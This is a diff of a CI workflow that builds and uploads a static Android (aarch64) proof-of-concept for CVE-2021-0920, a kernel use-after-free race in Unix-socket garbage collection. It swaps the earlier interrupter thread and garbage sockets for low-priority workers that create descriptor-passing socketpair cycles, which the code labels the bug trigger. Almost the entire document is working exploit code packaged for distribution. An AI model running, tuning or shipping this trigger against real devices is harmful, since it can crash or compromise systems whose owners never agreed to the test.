@@ -1,4 +1,4 @@
-name: build_cve_2021_0920_poc_v4_fixed
+name: build_cve_2021_0920_poc_v5_nice
 on: [push, workflow_dispatch]
 
 jobs:
@@ -14,7 +14,7 @@ jobs:
           ndk-version: r27c
           add-to-path: true
 
-      - name: Write improved PoC source
+      - name: Write PoC source
         run: |
           cat << 'EOF' > poc.c
           #define _GNU_SOURCE
@@ -24,20 +24,13 @@ jobs:
           #include <stdio.h>
           #include <stdlib.h>
           #include <string.h>
-          #include <sys/epoll.h>
+          #include <sys/resource.h>
           #include <sys/socket.h>
-          #include <sys/timerfd.h>
           #include <sys/types.h>
-          #include <sys/wait.h>
           #include <time.h>
           #include <unistd.h>
 
-          #define NUM_ATTEMPTS 500
-          #define NUM_PARALLEL 4
-
-          static pthread_mutex_t g_mutex = PTHREAD_MUTEX_INITIALIZER;
-          static int g_success = 0;
-          static int g_crashed = 0;
+          #define NUM_ATTEMPTS 1000
 
           static int send_fd(int sock, int fd) {
               struct msghdr msg = {0};
@@ -56,30 +49,21 @@ jobs:
               return sendmsg(sock, &msg, 0);
           }
 
-          static void create_garbage(int count) {
-              for (int i = 0; i < count; i++) {
-                  int s = socket(AF_UNIX, SOCK_STREAM, 0);
-                  if (s >= 0) {
-                      // Don't close - keep as garbage
-                  }
-              }
-          }
-
           static void *worker(void *arg) {
               (void)arg;
               int sv[2];
-              int pairs[64][2];
               
-              create_garbage(200);
+              // LOW priority (nice 19) - no CAP_SYS_NICE needed
+              setpriority(PRIO_PROCESS, 0, 19);
+              sched_yield();
               
               for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
                   if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;
                   
-                  for (int i = 0; i < 64; i++) {
-                      if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) < 0) {
-                          pairs[i][0] = -1; pairs[i][1] = -1;
-                          continue;
-                      }
+                  // Create many cycles (this is the bug trigger)
+                  int pairs[32][2];
+                  for (int i = 0; i < 32; i++) {
+                      if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) < 0) break;
                       send_fd(sv[0], pairs[i][0]);
                       send_fd(pairs[i][0], pairs[i][1]);
                       send_fd(pairs[i][1], pairs[i][0]);
@@ -90,83 +74,49 @@ jobs:
                   
                   sched_yield();
                   
-                  for (int i = 0; i < 64; i++) {
-                      if (pairs[i][0] >= 0) close(pairs[i][0]);
-                      if (pairs[i][1] >= 0) close(pairs[i][1]);
+                  for (int i = 0; i < 32; i++) {
+                      close(pairs[i][0]);
+                      close(pairs[i][1]);
                   }
                   
-                  pthread_mutex_lock(&g_mutex);
-                  if (attempt % 50 == 0) {
+                  if (attempt % 100 == 0) {
                       printf("[worker] attempt %d/%d\n", attempt, NUM_ATTEMPTS);
                       fflush(stdout);
                   }
-                  pthread_mutex_unlock(&g_mutex);
               }
-              return NULL;
-          }
-
-          static void *interrupter(void *arg) {
-              int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
-              if (tfd < 0) return NULL;
-              
-              int epfd = epoll_create1(0);
-              if (epfd >= 0) {
-                  struct epoll_event ev = { .events = EPOLLIN };
-                  for (int i = 0; i < 10000; i++) {
-                      epoll_ctl(epfd, EPOLL_CTL_ADD, tfd, &ev);
-                  }
-              }
-              
-              for (int i = 0; i < 1000; i++) {
-                  struct itimerspec its = { .it_value = { .tv_nsec = 1000 } };
-                  timerfd_settime(tfd, 0, &its, NULL);
-                  usleep(1000);
-              }
-              
-              if (epfd >= 0) close(epfd);
-              close(tfd);
               return NULL;
           }
 
           int main(void) {
-              printf("[*] CVE-2021-0920 improved PoC\n");
-              printf("[*] Running with %d parallel workers, %d attempts each\n", 
-                     NUM_PARALLEL, NUM_ATTEMPTS);
-              printf("[*] Note: this only tests if the UAF is reachable.\n");
-              printf("[*] If the device crashes, the bug is confirmed.\n\n");
+              printf("[*] CVE-2021-0920 PoC v5 (with positive nice)\n");
+              printf("[*] Using setpriority(nice=19) - no CAP_SYS_NICE needed\n");
+              printf("[*] Running %d attempts\n\n", NUM_ATTEMPTS);
               
-              pthread_t interrupt_thread;
-              pthread_create(&interrupt_thread, NULL, interrupter, NULL);
-              
-              pthread_t workers[NUM_PARALLEL];
-              for (int i = 0; i < NUM_PARALLEL; i++) {
+              pthread_t workers[4];
+              for (int i = 0; i < 4; i++) {
                   pthread_create(&workers[i], NULL, worker, NULL);
               }
               
-              for (int i = 0; i < NUM_PARALLEL; i++) {
+              for (int i = 0; i < 4; i++) {
                   pthread_join(workers[i], NULL);
               }
               
-              pthread_join(interrupt_thread, NULL);
-              
               printf("\n[*] PoC finished without crash.\n");
               printf("[*] The race did not trigger on this run.\n");
-              printf("[*] This does NOT mean the bug doesn't exist - it may just need different timing.\n");
               
               return 0;
           }
           EOF
 
-      - name: Compile PoC
+      - name: Compile
         env:
           ANDROID_NDK_HOME: ${{ steps.setup-ndk.outputs.ndk-path }}
         run: |
           $ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang \
-            -static -O2 -pthread poc.c -o poc_v4
-          file poc_v4
-          ls -la poc_v4
+            -static -O2 -pthread poc.c -o poc_v5
+          ls -la poc_v5
 
       - uses: actions/upload-artifact@v4
         with:
-          name: cve-2021-0920-poc-v4
-          path: poc_v4
+          name: cve-2021-0920-poc-v5
+          path: poc_v5
